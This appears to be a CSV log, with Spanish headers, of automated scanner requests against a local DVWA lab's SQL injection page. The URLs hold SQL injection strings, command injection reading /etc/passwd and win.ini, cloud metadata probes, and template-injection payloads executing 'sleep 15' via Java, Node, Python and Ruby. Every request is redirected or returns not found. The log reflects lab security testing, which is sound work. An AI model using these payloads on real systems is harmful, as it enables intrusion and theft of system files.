ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
133,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2Bresponse.write%28839%2C311*943%2C382%29%2B%22,302,Found,1,628,0
134,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,302,Found,1,628,0
135,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=response.write%28839%2C311*943%2C382%29,302,Found,1,628,0
136,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=cat+%2Fetc%2Fpasswd&Submit=Submit,302,Found,1,628,0
137,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26cat+%2Fetc%2Fpasswd%26&Submit=Submit,302,Found,1,628,0
138,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,5,224,366
139,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bcat+%2Fetc%2Fpasswd%3B&Submit=Submit,302,Found,1,628,0
140,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26cat+%2Fetc%2Fpasswd%26%22&Submit=Submit,302,Found,2,628,0
141,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bcat+%2Fetc%2Fpasswd%3B%22&Submit=Submit,302,Found,0,628,0
142,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26cat+%2Fetc%2Fpasswd%26%27&Submit=Submit,302,Found,1,628,0
143,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bcat+%2Fetc%2Fpasswd%3B%27&Submit=Submit,302,Found,2,628,0
144,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
145,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,2,628,0
146,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
147,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&Submit=Submit,302,Found,1,628,0
148,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
149,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&Submit=Submit,302,Found,4,628,0
150,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
151,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=get-help&Submit=Submit,302,Found,1,628,0
152,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help&Submit=Submit,302,Found,1,628,0
153,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bget-help&Submit=Submit,302,Found,1,628,0
154,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bget-help&Submit=Submit,302,Found,2,628,0
155,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help+%23&Submit=Submit,302,Found,1,628,0
156,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=cat+%2Fetc%2Fpasswd,302,Found,0,628,0
157,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26cat+%2Fetc%2Fpasswd%26,302,Found,1,628,0
158,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bcat+%2Fetc%2Fpasswd%3B,302,Found,1,628,0
159,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26cat+%2Fetc%2Fpasswd%26%22,302,Found,1,628,0
160,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bcat+%2Fetc%2Fpasswd%3B%22,302,Found,1,628,0
161,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26cat+%2Fetc%2Fpasswd%26%27,302,Found,0,628,0
162,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bcat+%2Fetc%2Fpasswd%3B%27,302,Found,1,628,0
163,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,0,628,0
164,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
165,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
166,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,302,Found,1,628,0
167,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
168,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,302,Found,0,628,0
169,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
170,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=get-help,302,Found,1,628,0
171,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help,302,Found,1,628,0
172,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bget-help,302,Found,1,628,0
173,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bget-help,302,Found,1,628,0
174,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help+%23,302,Found,1,628,0
175,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%27&Submit=Submit,302,Found,1,628,0
176,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,243,366
177,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--&Submit=Submit,302,Found,2,628,0
178,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%5D%5D%3E&Submit=Submit,302,Found,2,628,0
179,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%27,302,Found,1,628,0
180,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--,302,Found,1,628,0
181,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%5D%5D%3E,302,Found,0,628,0
182,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
183,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
184,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,3,161,317
185,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,0,161,317
186,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/computeMetadata/v1/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
187,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/computeMetadata/v1/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,326
188,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/opc/v1/instance/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
189,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/opc/v1/instance/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,326
190,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj+1187*6926+zj&Submit=Submit,302,Found,0,628,0
191,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,0,161,317
192,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,321
193,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B5392*6345%7Dzj&Submit=Submit,302,Found,1,628,0
194,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/metadata/instance?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
195,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%24%7B7474*2087%7Dzj&Submit=Submit,302,Found,2,628,0
196,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%23%7B5011*1592%7Dzj&Submit=Submit,302,Found,1,628,0
197,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%235268*8769%7Dzj&Submit=Submit,302,Found,1,628,0
198,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%408240*9490%7Dzj&Submit=Submit,302,Found,1,628,0
199,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B5093*7710%7D%7Dzj&Submit=Submit,302,Found,1,628,0
200,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B%3D8694*8427%7D%7Dzj&Submit=Submit,302,Found,1,628,0
201,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%3C%25%3D3870*3620%25%3Ezj&Submit=Submit,302,Found,1,628,0
202,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%23set%28%24x%3D8998*2763%29%24%7Bx%7Dzj&Submit=Submit,302,Found,1,628,0
203,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%3Cp+th%3Atext%3D%22%24%7B5583*3057%7D%22%3E%3C%2Fp%3Ezj&Submit=Submit,302,Found,1,628,0
204,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%40math+key%3D%229513%22+method%3D%22multiply%22+operand%3D%225550%22%2F%7Dzj&Submit=Submit,302,Found,1,628,0
205,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7B71630%7Cadd%3A97810%7D%7Dzj&Submit=Submit,302,Found,14,628,0
206,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%7Bprint+%229730%22+%226095%22%7D%7Dzj&Submit=Submit,302,Found,3,628,0
207,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj+6747*5580+zj,302,Found,4,628,0
208,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B8764*8224%7Dzj,302,Found,1,628,0
209,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%24%7B6517*8756%7Dzj,302,Found,1,628,0
210,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%23%7B9426*5652%7Dzj,302,Found,3,647,0
211,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%239638*4805%7Dzj,302,Found,2,628,0
212,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%403688*1351%7Dzj,302,Found,1,628,0
213,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B6065*2330%7D%7Dzj,302,Found,1,628,0
214,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B%3D8358*4711%7D%7Dzj,302,Found,0,628,0
215,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%3C%25%3D5282*1517%25%3Ezj,302,Found,1,628,0
216,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%23set%28%24x%3D6394*9042%29%24%7Bx%7Dzj,302,Found,0,628,0
217,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%3Cp+th%3Atext%3D%22%24%7B1454*4053%7D%22%3E%3C%2Fp%3Ezj,302,Found,1,628,0
218,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%40math+key%3D%225377%22+method%3D%22multiply%22+operand%3D%229325%22%2F%7Dzj,302,Found,1,628,0
219,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7B90180%7Cadd%3A66970%7D%7Dzj,302,Found,1,628,0
220,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=zj%7B%7Bprint+%227670%22+%228099%22%7D%7Dzj,302,Found,1,628,0
221,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
222,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&Submit=Submit,302,Found,2,628,0
223,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&Submit=Submit,302,Found,1,628,0
224,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&Submit=Submit,302,Found,1,628,0
225,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&Submit=Submit,302,Found,0,628,0
226,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&Submit=Submit,302,Found,1,628,0
227,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&Submit=Submit,302,Found,2,628,0
228,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&Submit=Submit,302,Found,0,628,0
229,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&Submit=Submit,302,Found,2,628,0
230,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&Submit=Submit,302,Found,2,628,0
231,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D%25x%28sleep+15%29%25%3E&Submit=Submit,302,Found,1,628,0
232,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7B%25x%28sleep+15%29%7D&Submit=Submit,302,Found,1,628,0
233,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7Bsystem%28%22sleep+15%22%29%7D&Submit=Submit,302,Found,1,628,0
234,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,302,Found,1,628,0
235,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,302,Found,0,628,0
236,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,302,Found,1,628,0
237,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,302,Found,1,628,0
238,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,302,Found,1,628,0
239,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,302,Found,1,628,0
